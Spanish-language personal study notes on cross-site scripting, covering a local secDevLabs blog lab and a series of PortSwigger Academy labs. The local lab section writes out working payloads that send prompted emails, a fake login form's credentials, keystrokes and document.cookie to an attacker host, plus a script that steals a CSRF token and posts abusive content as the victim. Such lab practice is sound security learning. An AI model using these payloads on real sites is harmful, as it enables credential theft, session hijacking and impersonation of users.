------
Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.

Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:

- **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
- **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
- **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.

A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:

- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)

## Notas de las Practicas

En este caso estamos haciendo pruebas en local donde lo que queremos lograr es ver si la web en cualquier campo de entrada interpreta código, en este caso estamos en una web tipo blog donde puedes realizar publicaciones y en este caso vamos a ver si podemos en alguno de estos campos hacer que se interprete el código `html`:

![[Pasted image 20250824153645.png]]

Como vemos intentamos ingresar código html, enviamos esto y veamos si se interpreta en algún campo:

![[Pasted image 20250824153731.png]]

Podemos ver que en los dos primeros campos no se interpreta pero en el de texto si lo hace por lo que ya nos llama la atención.

En este caso podemos intentar ver si se interpreta alguna otra etiqueta:

![[Pasted image 20250824153945.png]]

![[Pasted image 20250824154000.png]]

en la imagen no podemos verlo pero el `Hacked` se mueve de un lado al otro.

Como podemos ver si se interpreta etiquetas html y le problema surge porque nosotros podemos ingresar etiquetas que interpreten código Java Script el cual puede ser interpretado y ya a partir de allí comenzar con diferentes ataques, y para confirmarlo vamos a hacer lo siguiente:

![[Pasted image 20250824154253.png]]

![[Pasted image 20250824154306.png]]

Como vemos si logramos inyectar pequeños comandos y por el momento no es algo critico ya que es una aleta pero nada mas, pero nosotros esto podemos derivarlo a algo mucho mas grave y es por eso que si se encuentran este tipo de vulnerabilidades se deben reportar.

Continuando vamos a inyectar código JavaScript mas avanzado en el cual se le pidan al usuario credenciales y que estas se terminen enviando a nosotros por detrás, esto de la siguiente manera:

Vamos a tener el siguiente código que se encargara de pedir un correo valido al usuario y nos lo enviara a nostros

```html
<script>
  var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");

  if (email == null || email == "" ){
    alert("Es necesario introducir un correo valido para visualizar el post");
  }else{
    fetch("http://192.168.1.70/" + email);
  }
</script>

```

![[Pasted image 20250824155156.png]]

![[Pasted image 20250824155229.png]]

Podemos ver que nos pide el correo por lo que vamos a ponerlo, claro para esto tenemos que tener un servidor corriendo para que las peticiones lleguen como veremos:

![[Pasted image 20250824155430.png]]

Como observamos en nuestro servidor llega la petición con el correo y la contraseña que acaba de introducir el usuario, con esto ya tenemos una forma de robar credenciales.
Claro que esto es una forma muy rara y delatable de hacerlo por lo que una forma mas sofisticada puede ser el siguiente código que ya utiliza lo que es html y javascript para que todo  quede mucho mas real  para los usuario.

```html
<div id="formContainer"></div>

<script>
  var email;
  var password;

  var form = '<form>' + 
  '<label>Email:</label> <input type="email" id="email" required>' +
  '<label>Password:</label> <input id="passowrd" type="password" required>' +
  '<input type="submit" value="enviar" onclick="submitForm()">'+
  '</form>';

  document.getElementById("formContainer").innerHTML = form;

  function submitForm(){
    event.preventDefault();
    email = document.getElementById("email").value;
    password = document.getElementById("passowrd").value;
    fetch("http://192.168.1.70/?email=" + email + "&passowrd=" + password);
  }
</script>
```

![[Pasted image 20250824173455.png]]

y ya dentro del mensaje podremos verlo así:

![[Pasted image 20250824173523.png]]

Como podemos ver ya es mas realista y lo podemos probar enviando datos y veremos que ya los obtenemos como petición en nuestro servidor:

![[Pasted image 20250824173639.png]]

como vemos ya obtenemos los datos.

De igual forma podríamos intentar crear un key-logger mediante javascrip de la siguiente manera:
```html
<script>
var k = "";
document.onkeypress = function (e) {
  event.preventDefault();
  e = e || window.event;
  k += e.key;
  var i = new Image();
  i.src = "http://192.168.1.70/" + k;
}
</script>
```

y en la web seria:

![[Pasted image 20250824180929.png]]

y el funcionamiento al entrar al post y con el servidor de python levantado en este caso de la siguiente manera:
```bash
python3 -m http.server 80 2>&1 | grep --line-buffered -oP 'GET\K.[^H]+' | sed 's/%20/ /g'
```

ya con esto veremos como output lo siguiente:

![[Pasted image 20250824181118.png]]

esto en tiempo real.

También podremos redirigir al usuario a otras webs de la siguiente menera:

![[Pasted image 20250824181450.png]]

con esto al tratar de entrar en el post vamos a ver que nos manda a google.com.

Ahora otra cosa que podemos hacer es que nosotros podemos usar archivos externos de JavaScript de la siguiente manera:

![[Pasted image 20250824182232.png]]

vemos que estamos llamando a un archivo llamado `test.js` el cual vamos a exponer con ayuda de un servidor en python y el contenido de test.js va a ser:

```js
 var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.70/?cookie=' + document.cookie);
request.send();
```

En este caso lo que estamos haciendo es un secuestro de la cookie claro revisando que `httpOnly` este desactivado si no no lo podremos hacer.

![[Pasted image 20250824183501.png]]

al servidor nos llegaran todas las cookies asociadas a la web por lo que si tenemos mas de una llegaran separadas por un ; y un espacio. Con esto ya tenemos la cookie de session del usuario y podríamos ingresar sin necesidad de ingresar contraseñas.

Por ultimo ahora vamos a ver como hacer que un usuario al entrar a nuestro post o publicación cree una el con datos que nosotros pongamos, vamos a continuar directamente con los código pero se tiene que saver que para saber cuales son los campos y la estructura que tenemos que usar vamos a tener que analizar con BurpSuite su estructura, ahora solo vemos primero el código `js`:

En muchas de las veces las webs van a contar con un token único y dinámico que se genera al ingresar a la web y se almacena y puede ser requerido para las diferentes peticiones, esto suele pedirse en el html como valor oculto llamado `csrf_token`

![[Pasted image 20250824193847.png]]

esto se genera al entrar a la web para crear el post, con esto lo que vamos a hacer en el siguiente script es tratar de obtener uno valido para el usuario de la siguiente manera:

```js
var domain = "http://localhost:10007/newgossip"
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false); // false si es Sincrona (espera a que se resiva datos), true si es Asincrona (si no queremos esperar nada)
req1.send();

var response = req1.responseText;
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.1.70/?response=' + btoa(response)); // btoa para ponerlo en base64 ya que nos traemos todo el html
req2.send();
```

a rasgos generales realizamos 2 peticiones la primera `req1` recupera la web desde el usuario y la almacena para luego luego en la segunda petición `req2` enviarnos todo lo recuperado que seria el HTML que contiene el token y todo eso en base64 a nuestro servidor como una petición por lo que veremos algo así en nuestro servidor:

![[Pasted image 20250824194353.png]]

una vez que tenemos ya esto podemos realizar el proceso inverso y obtener ese token:

![[Pasted image 20250824194717.png]]

ya con este token valido vamos a realizar la consulta con los datos requeridos, recuerda sacar todo con ayuda de BurpSuite.

```js
var domain = "http://localhost:10007/newgossip"
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false); // false si es Sincrona (espera a que se resiva datos), true si es Asincrona (si no queremos esperar nada)
req1.withCredentials = true; // Esto es por si es dinamico y cambia lo arrastre
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, "text/html");
var token = doc.getElementsByName("_csrf_token")[0].value; // obtenemos el token

var req2 = new XMLHttpRequest();
var data = "title=Mi%20Jefe%20es%20una%20basura&subtitle=El%20Marico&text=Odio%20a%20todo%20el%20equipo%20de%20trabajo%20porque%20son%20unos%20vajos%20de%20mierda%20y%20mi%20jefe%20es%20el%20peor%20de%20todos%20maldito%20cerdo&_csrf_token=" + token;
req2.open('POST', "http://localhost:10007/newgossip", false);
req2.withCredentials = true;
req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); // Siempre es nesesario
req2.send(data);
```

En este caso ya tenemos el script listo y el servidor corriendo cuando otro usuario entre a la publicación que llama al scrip se creara la publicación como el otro usuario como veremos en la imagen:

![[Pasted image 20250824200806.png]]

![[Pasted image 20250824200816.png]]

como podemos observar ya se logro el cometido.

Vamos con otro caso donde suponemos que la maquina tiene un firewall el cual protege una serie de puertos internos a los cuales no podemos acceder, en este caso lo que se va a tratar de hacer es configurar un script que permita que la maquina se realize una consulta a si misma lo que seria valido por el firewall, esa respuesta la almacenamos y la enviamos como petición en base64 a nuestro servidor y ya podríamos ver los puertos en este caso pero usando el mismo concepto podemos listar información privilegiada.


## Notas PortSwigger

### Lab: Reflected XSS into HTML context with nothing encoded

Este laboratorio es bastante básico y lo principal es buscar un campo donde provocar un alert, lo primero que se suele hacer es ver si se logra inyectar etiquetas básicas como son:  `h1,h2,marquee`.
![[Pasted image 20250906180233.png]]
En este caso se inyecto un `<h1>Hola</h1>` por eso es que lo vemos enorme por lo que ya encontramos el campo donde es valida la inyección, ya con esto vamos a inyectar el alert:

![[Pasted image 20250906180344.png]]
![[Pasted image 20250906180358.png]]
![[Pasted image 20250906180414.png]]
Perfecto logramos inyectar el alert y la maquina esta terminada.


### Lab: Stored XSS into HTML context with nothing encoded

Mismo caso comenzamos con inyecciones básicas con el objetivo de identificar donde se produce la inyección:
![[Pasted image 20250906180811.png]]
Se realizo un comentario y en la parte del cuerpo del comentario se obtuvo una inyección exitosa por lo que el punto es volver a generar una alerta y así que lo vamos a hacer:
![[Pasted image 20250906180929.png]]
![[Pasted image 20250906180942.png]]
![[Pasted image 20250906180955.png]]
Maquina terminada.

### Lab: DOM XSS in document.write sink using source location.search

Comenzamos buscando e intentando una inyección:
![[Pasted image 20250906182039.png]]
![[Pasted image 20250906182603.png]]
Si revisamos el código fuente de la web nos encontramos que el input de nuestra búsqueda se inserta dentro de una etiqueta tal y cual como lo vemos en la imagen, esto no es del todo correcto ni seguro ya que al ver esto podríamos intentar cerrar primero esa doble comilla de la petición y luego cerrar el `>` para que lo que nosotros ingresemos a continuación se inserte dentro de la web, Esta es la base del XSS DOM-Based donde se llega a modificar directamente la web las etiquetas, vamos a hacerlo:
![[Pasted image 20250906183059.png]]
Vemos que como se tenia visto se logra inyectar dentro de la web código en si etiquetas que serán interpretadas ahora el ultimo `">` que vemos es del cierre original que gracias a que al comienzo lo cerramos queda botado por decirlo de alguna manera.

Con esto ya claro lo que vamos a intentar ahora es inyectar el alert usual.
![[Pasted image 20250906183331.png]]
![[Pasted image 20250906183427.png]]
La que usamos es lo que se ve en la pantalla y ahora podemos ver que la maquina esta terminada.

### Lab: DOM XSS in innerHTML sink using source location.search

En este caso al igual que en todos los anteriores vamos a intentar diferentes tipos de inyecciones:

![[Pasted image 20250906185803.png]]
![[Pasted image 20250906185812.png]]
Vemos que esto es válido, en este punto lo que podemos intentar es insertar el alert:
![[Pasted image 20250906185843.png]]
![[Pasted image 20250906185854.png]]
Vemos que no nos interpreta, ahora podemos intentar talvez cerrar el alert con un `;`:
![[Pasted image 20250906185933.png]]
![[Pasted image 20250906185941.png]]
Tampoco es válido, en este punto lo que vamos a hacer es intentar otro tipo de inyección donde vamos a intentar inyectar una imagen cualquiera:
![[Pasted image 20250906190034.png]]
![[Pasted image 20250906190045.png]]
Bueno vemos la imagen, ahora viendo que nos permite ingresar una etiqueta de imagen y es valida, podemos tratar de subir una sintaxis invalida de una imagen para forzar un error y en ese error vamos a intentar la inyección:
![[Pasted image 20250906190227.png]]
![[Pasted image 20250906190241.png]]
Esto es excelente ya podemos ver que se acontece la inyección:
![[Pasted image 20250906190347.png]]
Maquina terminada.

### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

En este lab el punto es obtener los la cookie, vamos primero a identificar el campo vulnerable que en este caso es la parte de Submit Feedback:

![[Pasted image 20250906210148.png]]
Ahora algo que esta llamando mucho la atención es la URL y el como esta compuesta, podríamos intentar poner diferentes rutas y ver que es lo que nos devuelve o como reacciona la web:
![[Pasted image 20250906210310.png]]
Así de primeras nos carga la web sin mas pero aquí tenemos que probar de todo y eso incluye el hacer Hover-In en los botones a ver a donde se dirigen o a que es lo que hacen referencia:

![[Pasted image 20250906210427.png]]
Esa es la referencia del botón Back en donde vemos que lo que ponemos en la url se esta insertando de forma directa en la url de back, ahora veamos el como esta creado ese back:
![[Pasted image 20250906210532.png]]
Se hace uso de `href`, algo que nosotros siempre tenemos que tener en cuenta es que mediante el parámetro `href` uno puede ejecutar instrucciones de JavaScript, hoy en día eso ya no se debería poder hacer pero nunca esta mal saberlo, con esto en mente el como vamos a inyectar la instrucción del alert es de la siguiente manera:

![[Pasted image 20250906210751.png]]

En si si enviamos se completa el laboratorio pero no vemos nada:
![[Pasted image 20250906210818.png]]
Esto es  porque recordemos que la inyección se realizo dentro del botón Back por lo tanto al hacer click vamos a ejecutar el código:
![[Pasted image 20250906210917.png]]
Listo Lab Terminado.

### Lab: DOM XSS in jQuery selector sink using a hashchange event

En este lab lo que vamos a intentar es aprovecharnos de dos cosas:
- Primero del concepto de JQuery y es que JQuery cuando encuentra en sus entradas o donde se implemente detecta código HTML lo va a crear de forma temporal y al crearlo por ende lo ejecuta.
- Segundo lo que vamos a aprovechar es de como funcionan los eventos.

![[Pasted image 20250906212914.png]]
Vemos la web por ahora normal y cuando vemos que se tiene blogs o noticias y publicaciones, en ocasiones se implementa el uso de `#` con el objetivo de realizar un AutoScroll hacia un lugar determinado de la web y esto podemos probarlo:
![[Pasted image 20250906213126.png]]
En este caso vemos que sucede, ahora si nosotros nos movemos y recargamos vamos a ver que no lo hace ya no nos lleva y esto tenemos que asociarlo a que talvez la web esta buscando por cambios luego del `#` lo que al no haber cambios y solo recargar no realizaría el evento.

con esto en mente vamos a considerar el primer caso donde si de alguna manera ese evento fue creado con JQuery podemos intentar poner etiquetas HTML y JQuery no solo lo va a interpretar si no que también lo va a crear de forma temporal, vemos que sucede:

![[Pasted image 20250906213456.png]]
Excelente esto ya funciona.

Ahora algo que no consideramos es que si recargamos o lo abrimos de golpe en una nueva pagina diciendo que esto le enviamos a la victima no se ejecuta ya que los cambios los detecta ya cargada la web.
En este caso podemos jugar un una etiqueta de HTML especial la cual nos permite de alguna forma hacer esto y es `iframe` entonces vamos a intentarlo:

![[Pasted image 20250906214151.png]]
Vemos como estamos usando la etiqueta `iframe` donde con `onload` le indicamos como se modifica donde al contenido del `src` que es la url base le agregamos algo, en este caso `Fake News` el objetivo es que al abrir la url de forma automática nos deslice a esa publicación:

![[Pasted image 20250906215447.png]]
Vemos que funciona recordemos que tenemos en el PortSwigger una opción que simula un VPS por lo tanto es como si cargáramos la url maliciosa y se abre tal cual.
En este punto nos pedía el Lab un print() a si que vamos a modificarlo y ver si el lab se completa:
![[Pasted image 20250906215733.png]]
Eso se le despliega a la victima y con eso  si enviamos completamos el Lab:
![[Pasted image 20250906215809.png]]
Lab Terminado.

### Lab: Reflected XSS into attribute with angle brackets HTML-encoded

Bueno la función principal de este laboratorio es que a los `<>` nos lo codifica y esto en una inyección provocaría que no se interprete por lo que vamos a intentar burlarlo

![[Pasted image 20250906220439.png]]
Allí es la inyección pero vemos que no nos lo interpreta por lo que podemos ver como se esta representando eso:
![[Pasted image 20250906220636.png]]
Vemos que se esta insertando directamente dentro de value por lo que podemos intentar primero cerrar todo eso y luego efectuar a inyección:
![[Pasted image 20250906220842.png]]
Vemos que logramos el cometido pero que ahora los `<>` nos lo esa representando como `&gt y &lt` esta es la representación codificada por lo que no podemos inyectar etiquetas.

En este punto lo mejor es ir probando cosas como solo poner una `"` y ve como queda la etiqueta:
![[Pasted image 20250906221256.png]]
Como vemos logramos cerrar lo que es el `value`, en este punto seria de jugar con la sintaxis con el objetivo de ver si podemos agregar atributos de forma correcta:
![[Pasted image 20250906221525.png]]
Observamos que ya tenemos la sintaxis correcta y logramos inyectar un atributo, en este caso lo que vamos a hacer es agregar algún tipo de evento el cual permite la ejecución de código en JavaScript como pude ser `onmouseover`:
![[Pasted image 20250906221727.png]]
Observamos debajo la sintaxis y también como logramos el cometido además de que ya esta Lab Terminado.

### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

En este punto es volver a aprovecharnos de los `href` los cuales si logramos por defecto nosotros ponerle información, se puede ejecutar código JavaScript, en este caso la parte vulnerable es el apartado de web de un post:
![[Pasted image 20250906222628.png]]
La forma correcta de aprovecharnos de esta ya la conocemos por lo cual vamos a llenar directamente y veamos como queda:
![[Pasted image 20250906222752.png]]
Listo.

Enviamos y revisemos si esto se ejecuta correctamente:
![[Pasted image 20250906222854.png]]
Perfecto algo que tenemos que tener en cuenta es que el link se asocia directamente al nombre de usuario y al hacer click se ejecuta.
![[Pasted image 20250906222931.png]]
Lab Terminado.

### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

Algo que también es bueno siempre intentar es ver si de alguna forma nosotros estamos insertando código directamente en la plantilla de JavaScript, me refiero por ejemplo a que al nosotros escribir algo en el campo de búsqueda y buscar por detrás ese output se almacena directamente de la siguiente manera `test='output'` donde no tenga precauciones y se pueda insertar cosas como `'` mediante la cual podemos intentar ingresar código JavaScript que es lo que vamos a intentar, algo a tener en cuenta es que si logramos esta inyección siempre tendremos una comilla colgada la cual para cerrarla vamos a crear una variable con contenido y que esa comilla lo cierre, con esto claro la inyección en este caso es tan sencillo como:

![[Pasted image 20250906224127.png]]

Vemos la inyección y en este caso si lo enviamos se ejecuta la alerta:
![[Pasted image 20250906224210.png]]
Con esto se completa la maquina:
![[Pasted image 20250906224233.png]]
Lab Terminado.


### Lab: DOM XSS in document.write sink using source location.search inside a select element

Nosotros siempre tenemos que intentarlo todo, por mas loco que sea o suene y es que por ejemplo la configuración de esta web hace algo que no tiene sentido, primero la vuln esta en en el siguiente apartado:
![[Pasted image 20250906225605.png]]

al parecer es en el apartado donde sale London, pero esto se tramita por post por lo que vamos a ver como es que se tramita:
![[Pasted image 20250906225723.png]]

Vemos que se tramita mediante el `storeId=algo` aquí es donde entra la locura, veamos que pasa si le pasamos ese parámetro en la url por get:
![[Pasted image 20250906225847.png]]
Miremos como se inserto la opción dentro de las opciones, revisemos el HTML a ver que es lo que cambio:
![[Pasted image 20250906225937.png]]
Vemos que se inserto otra opción `Hacked` dentro del select ahora si esto no tiene sanitización podriamos simple mente cerrar las etiquetas de option y select para luego ingresar las etiquetas que queramos, vemos como nos queda la url y si funciona:
![[Pasted image 20250906230141.png]]
Perfecto acaba de funcionar, vamos ahora a intentar el alert para terminar ver si se ejecuta:
![[Pasted image 20250906230249.png]]
Perfecto.

![[Pasted image 20250906230306.png]]
Lab Terminado.

### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

En el caso de este tipo de vulnerabilidades tenemos que primero identificar la tecnología que se esta empleando, esto podemos hacerlo identificando diferentes directivas en el código o con ayuda de herramientas Externas como wappalyzer, en este caso cualquiera de los dos podemos ver que tenemos la misma respuesta y es que se esta usando `AngularJS`, vamos a ver como se hace:

 - Wappalyzer:
![[Pasted image 20250907114319.png]]

- En el código fuente podemos ver el body una etiqueta esencial que es la de `ng-app`:
![[Pasted image 20250907114514.png]]

Como podemos observar tenemos la etiqueta en la web por lo que es un indicador del uso de `AngularJS`.

En estos escenarios ya no podemos hacer las inyecciones comunes que venimos haciendo:
![[Pasted image 20250907114858.png]]

Como vemos no funciona, en estos casos es optimo ayudarnos de documentación como la que nos ofrece https://github.com/swisskyrepo/PayloadsAllTheThings
![[Pasted image 20250907115156.png]]
Recordemos que tiene también que ver las versiones en uso, en este caso era la 1.7.7 y encontramos una inyección que es la de la imagen para versiones 1.6 o superiores, vamos a usarla para tratar de inyectar un `Hacked` con una alerta:

![[Pasted image 20250907115439.png]]
![[Pasted image 20250907115511.png]]

Perfecto ya tenemos la inyección.

![[Pasted image 20250907115540.png]]
Listo Lab Terminado.

### Lab: Reflected DOM XSS

La base a comprender de los DOM XSS reflected es el como el servidor maneja los datos y los muestra en al respuesta.

En este laboratorio se realizo varios intentos de inyección mediante los cuales no se obtuvo nada pero vemos como se esta llamando a un script en especifico:
![[Pasted image 20250907121236.png]]
Vemos el script y además como este se esta haciendo la llamada del mismo con `search('search-results')`, con la ruta podemos intentar hacer la petición a ver si logramos ver el código del script:
```bash
	curl -s -X GET "https://0a270070035a8fab81de4e8400b900f8.web-security-academy.net/resources/js/searchResults.js" | cat -l javascript
```

![[Pasted image 20250907121642.png]]

Vemos que se esta implementando la función `eval()` la cual no es recomendable usar y su uso de por si es un riesgo por lo tanto ya tenemos algo por donde comenzar a escalar.

Vamos a realizar una búsqueda pasando por BurpSuite pero no interceptándola vamos a ver como fueron las peticiones que se realizaron mediante el Historial de Burp:
![[Pasted image 20250907122103.png]]
Vemos esa petición en especifico de como se esta llamando al script y se le pasa el parámetro.
Esa petición vamos a mandarla al repeater para jugar y ver como podemos inyectar código:
![[Pasted image 20250907122350.png]]

Podemos observar como mediante ese parámetro podemos controlar el valor en la respuesta.

Ahora el propósito es intentar escapar de la estructura en json como ya lo hemos echo con las etiquetas enviando `"` y así vamos a intentar algo:
![[Pasted image 20250907122822.png]]

Vemos que ya logramos cerrar la comilla del testing, esto es porque como medida de seguridad se esta implementando el escapar de forma automática y al pasarle una barra escapa la barra`\` provocando que no se escape la comilla y dejando el hola por fuera.

Ahora lo que tenemos que hacer intentar cerrar la estructura JSON y lo que queda colgado podemos intentar comentar el resto con doble comillas:

![[Pasted image 20250907123511.png]]

Perfecto ya estamos completando la estructura JSON donde si intentamos ejecutar un `alert` no veremos una respuesta, esto es porque el eval no sabe como interpretarlo o que hacer, para forzar que el alert intenta hacer algo es pasarle algún operador matemático con el objetivo de que el eval trate de obtener un valor y ejecute el `alert`.

![[Pasted image 20250907124031.png]]
Podemos ver que se esta insertando la operatoria vemos si es valida la inyección:
![[Pasted image 20250907124136.png]]
![[Pasted image 20250907124158.png]]
Observamos que si es valido y se ejecuto la inyección.
![[Pasted image 20250907124249.png]]
Lab Terminado.


### Lab: Stored DOM XSS

La base de este tipo de ataque es que la inyección se almacena dentro del servidor.

En este punto la parte inyectable es el blog y en la parte de comentario específicamente vamos a ver que sucede:
![[Pasted image 20250907130721.png]]
Vemos algo extraño se esta interpretando la primera etiqueta pero el cierre no lo interpreta. 

Esto ya nos indica algo raro y lo primero a pensar es que se esta realizando algún remplazo, pero lo extraño es que no se aplique a todo por lo que vamos a intentar agregar `<>` para que los primeros se remplacen y ver si los demás se quedan:

![[Pasted image 20250907132215.png]]
Perfecto ya se realiza la inyección pero vemos que no se interpreta, en este punto vamos a intentar diferentes métodos que permitan el paso a la inyección:
![[Pasted image 20250907132526.png]]

En este caso vemos que mediante la inyección de una imagen logramos generar el alert(0):

![[Pasted image 20250907132601.png]]
![[Pasted image 20250907132616.png]]
Listo Lab Terminada.


### Lab: Reflected XSS into HTML context with most tags and attributes blocked

En este punto nos estamos enfrentando a un nuevo reto por completo los desarrolladores se han encargado de crear alguna especie quiero creer yo que de black List referente a lo que son etiquetas las cuales al querer usarlas como por ejemplo el  `h1` vamos a ver lo siguiente:
![[Pasted image 20250907205200.png]]
Lo mismo para varias como son `script`, `img` y mas.

En este punto lo que tenemos que hacer es intentar ver que etiqueta si le gusta a la web para mediante esa intentar el ataque, por lo tanto vamos a encargarnos de obtener la petición en BurpSuite y con el Intruder vamos a intentar ver alguna etiqueta valida de la siguiente menera:

![[Pasted image 20250907205626.png]]
Vemos que vamos a intentar mediante fuerza bruta con ataque de tipo sniper encontrar de la lista de etiquetas alguna valida, la lista de etiquetas la podemos encontrar dentro de el CheetSheet de PortSwigger, en este punto enviamos el ataque:

![[Pasted image 20250907205822.png]]
vemos como para la etiqueta de body podemos usarla el indicador a mas de la web es el código de estado que nos esta arrojando que es 200.

![[Pasted image 20250907210018.png]]
Vemos que es valida por lo tanto ahora el objetivo es encontrar una manera de aprovecharnos de esa etiqueta.

Lo que podemos intentar es ver que eventos disponibles en body podemos usar y como podríamos aprovecharnos de los mismos, para esto vamos a volver a usar el intruder de la siguiente manera:

![[Pasted image 20250907210410.png]]
La configuración es similar a la de la etiqueta solo que ponemos un nombre cualquiera de evento y además lo igualamos a cualquier cosa el objetivo es tener algo sobre que hacer el ataque luego los eventos los sacamos igual del CheetSheet de PortSwigger y listo, vemos que obtenemos:

![[Pasted image 20250907210816.png]]
Vemos que tenemos uno del que podríamos abusar que es `onresize` donde al detectar un resize de la pantalla va a ejecutar una instrucción, esto podemos probarlo de la siguiente manera:

![[Pasted image 20250907210955.png]]
Al enviar de primeras no hace nada pero al realizar un resize vamos a ver que se ejecuta el evento que en este caso es el print:
![[Pasted image 20250907211042.png]]

Ahora la maquina no se resuelve solo con ejecutar de nuestro lado ya que tenemos que simular el ataque, para esto vamos a volver a jugar con la etiqueta `iframe` de la siguiente manera:

![[Pasted image 20250907211556.png]]
En este caso tenemos dos partes importantes el envío del src y además mediante el onload realizar un resize para que se ejecute el código.
![[Pasted image 20250907211656.png]]
Vemos que lo hace y con esto ya tenemos terminado el lab:
![[Pasted image 20250907211723.png]]
Lab Terminado.

### Lab: Reflected XSS into HTML context with all tags blocked except custom ones

En esta maquina el objetivo es hacer uso de etiquetas personalizadas porque todas están bloqueadas, el punto es que se se intente con ayuda del intruder y del CheetSheet lo mismo que de la maquina anterior con el objetivo de encontrar alguna pero vamos a ver que ninguna es valida.

En este caso nosotros podemos hacer uso de una etiqueta custom una que nosotros definamos y a esta asignarle un `onfocus` por ejemplo, la cual nos permite que al momento de seleccionar el texto o el elemento que lleve esta etiqueta se ejecute una acción, lo definimos de la siguiente manera:
![[Pasted image 20250907213331.png]]![[Pasted image 20250907213343.png]]
Esto no siempre funciona a la primera como vemos, seleccionamos lo que es el elemento y no se ejecuta, en ocasiones para que esto funcione lo que se tiene que hacer es a este elemento o etiqueta custom en este caso indicarle que puede ser seleccionando con `tabindex=1` esto activa por decirlo de alguna forma la selección y también la detección de esta selección:
![[Pasted image 20250907213529.png]]
![[Pasted image 20250907213652.png]]
Excelente en este punto ya funciona.

Recordemos que esto se tiene que ejecutar dentro de la maquina victima por lo que vamos a tener que forzar este seleccionar, en este caso ya no jugaremos con `iframe` sino creamos una estructura script la cual con `location` vamos a redirigir a la victima a la url vulnerable donde vamos a agregar a la etiqueta un identificador con el cual podamos mediante el uso de `#` ir o seleccionar directamente el elemento esto también provoca que salte o se ejecute el código malicioso y esto nos queda de la siguiente manera:
![[Pasted image 20250907214421.png]]
Si enviamos esto vemos que se ejecuta el alert:
![[Pasted image 20250907214444.png]]
Vemos que efectivamente funciona.
![[Pasted image 20250907214655.png]]
y con esto Lab Terminado.

Como dato extra también podemos jugar con el evento `autofocus` para que funcione, nos queda de la siguiente manera:
```html
<test onfocus=alert(document.cookie) tabindex=1 autofocus>
```
### Lab: Reflected XSS with some SVG markup allowed

En este punto lo que tenemos que hacer es la misma rutina de intentar todo y esto incluye el ver las etiquetas validas, para esto mediante el intruder de BurpSuite:

![[Pasted image 20250907220856.png]]
Vemos las etiquetas que apuntamos y con una búsqueda rápida obtenemos que con ayuda de `animatetransform` podemos ejecutar algún tipo de acción o cambio en un elemento, la sintaxis es `<svg><animatetransform></animatetransform></svg>`

En este punto y con esa información primero veamos si esas etiquetas son válidas:
![[Pasted image 20250907221115.png]]
Vemos que no tenemos errores en este punto.

Con esto claro ahora vamos a ver algún tipo de evento valido para la etiqueta de `animatetransform` de la siguiente manera:
![[Pasted image 20250907221311.png]]
tenemos todo correcto solo para aclarar que el `%20` antes del event en nuestra url es porque ese espacio si no lo codificamos en url no nos lo detecta como parte de la etiqueta y puede provocar errores. Ya con esto claro veamos que eventos son validos:

![[Pasted image 20250907221656.png]]
Vemos el evento `onbegin` el cual es al iniciar la animación, entonces con este evento podemos intentar inyectar un alert en la web quedando de la siguiente manera:
![[Pasted image 20250907221805.png]]
![[Pasted image 20250907221817.png]]
Excelente vemos que a funcionado.
![[Pasted image 20250907221834.png]]
Lab Terminado.

### Lab: Reflected XSS in canonical link tag

Esta inyección es muy parecida al de escapara de un envento y agregar otro pero algo especifico que buscamos es el uso de `canonical` dentro del código de la web ya que este se altera en ese punto:
![[Pasted image 20250907223909.png]]
Vemos que logro escapar en este caso por como esta diseñado el laboratorio vamos a hacer uso de `accessekey` para definir un atajo y además vamos a hacer uso de `onclick` para que al realizar el atajo se ejecute una acción en nuestro caso un alert y esto quedaría de la siguiente manera:
![[Pasted image 20250907224354.png]]
Podemos observar que al parecer se inyecto correctamente los eventos, en este punto lo que vamos a hacer es ver si funciona:
![[Pasted image 20250907224413.png]]
Listo lab  Terminado, recordemos que para que se ejecute es necesario de un `alt+x`.


###  Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

Bueno en este laboratorio vamos a ver como en el script definido dentro del html controlamos el input de una variable:
![[Pasted image 20250907230032.png]]
Como podemos observar se inserta dentro del script directamente la variable, lo que vamos a intentar en este punto es escapara de esas comillas pero vemos que las `'` se evitan al escaparlas y luego si intentamos con un `\` escapar el escape también falla ya que como precaución también se escapan las barras invertidas:

![[Pasted image 20250907230306.png]]

